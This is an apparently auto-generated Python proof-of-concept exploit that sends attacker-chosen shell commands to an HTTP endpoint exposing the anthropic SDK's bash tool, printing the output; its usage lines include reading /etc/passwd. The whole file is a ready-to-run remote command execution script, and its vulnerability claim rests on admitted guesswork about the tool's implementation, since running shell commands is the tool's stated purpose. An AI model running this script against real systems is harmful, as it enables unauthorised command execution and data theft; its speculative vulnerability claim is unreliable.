#!/usr/bin/env python3
# PoC for anthropic (/tmp/anthropic-sdk-python/src/anthropic)
# Path: rce-010
# Sink: bash_tool
# Auto-generated — run with: python3 rce_bashsession_bash_tool.py
#
#!/usr/bin/env python3
"""
PoC for RCE in anthropic bash_tool (command injection).

The `bash_tool` function in `anthropic/lib/tools/agent_toolset.py` defines an inner `bash`
function that passes the `command` argument directly to `BashSession.exec()` without any
input validation, sanitization, or sandboxing.  Because the tool's documented purpose is to
"run a command in a persistent bash shell", the underlying implementation almost certainly
launches a shell (e.g., `subprocess.Popen(..., shell=True)` or `bash -c`).  Any shell
metacharacters (;, |, &&, $(), backticks) are interpreted, allowing arbitrary command
execution.

This script exploits a service that exposes the bash tool via an HTTP endpoint (e.g., a
FastAPI or Flask app that calls the tool).  The attacker sends a crafted JSON payload with
a malicious `command` value.  The script is fully self-contained, uses only the standard
library plus `requests`, and includes a benign default payload.

Usage:
    python exploit.py http://target:8000/tool/bash
    python exploit.py http://target:8000/tool/bash -c "cat /etc/passwd"
"""

import argparse
import sys

try:
    import requests
except ImportError:
    print("[-] This PoC requires the `requests` library. Install it with: pip install requests")
    sys.exit(1)


def exploit(target_url: str, command: str) -> None:
    """
    Sends a POST request with the attacker-controlled command to the vulnerable endpoint.

    Args:
        target_url: The full URL of the bash tool endpoint (e.g., http://localhost:8000/tool/bash).
        command: The shell command to execute on the target.
    """
    print(f"[*] Targeting {target_url}")
    print(f"[*] Sending command: {command!r}")

    payload = {"command": command}  # The bash tool expects a JSON object with a "command" key

    try:
        resp = requests.post(target_url, json=payload, timeout=10)
        print(f"[*] HTTP status: {resp.status_code}")
        print("[*] Response body:")
        # Print the raw response – on success the tool returns stdout of the command
        # (or raises a ToolError if exit code != 0, which is also printed)
        print(resp.text)
    except requests.exceptions.RequestException as e:
        print(f"[!] Request failed: {e}")
        sys.exit(1)


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Proof‑of‑Concept: RCE via anthropic bash_tool command injection",
        epilog="Example: python exploit.py http://10.0.0.5:8080/tool/bash -c 'id'"
    )
    parser.add_argument(
        "target",
        help="URL of the exposed bash tool endpoint (e.g., http://localhost:8000/tool/bash)"
    )
    parser.add_argument(
        "-c", "--command",
        default="touch /tmp/poc_success.txt",
        help="Shell command to execute (default: creates /tmp/poc_success.txt)"
    )
    args = parser.parse_args()

    exploit(args.target, args.command)


if __name__ == "__main__":
    main()
